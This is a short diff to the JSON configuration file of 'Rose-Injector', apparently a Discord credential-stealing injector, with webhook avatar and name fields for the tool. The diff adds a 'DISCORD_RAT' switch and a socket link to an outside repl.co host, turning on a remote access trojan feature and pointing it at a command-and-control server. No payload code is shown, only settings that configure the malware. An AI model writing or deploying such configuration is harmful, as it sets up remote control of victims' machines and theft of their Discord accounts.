@@ -18,5 +18,8 @@
     "WH_AVATAR": "https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/tools/rose.png",
     "WH_NAME": "Rose-Injector",
     
-    "DEBUG_MODE": true
+    "DEBUG_MODE": true,
+
+    "DISCORD_RAT": true,
+    "DISCORD_RAT_SOCKET_LINK": "https://socketiotest.toopicogaming.repl.co"
 }
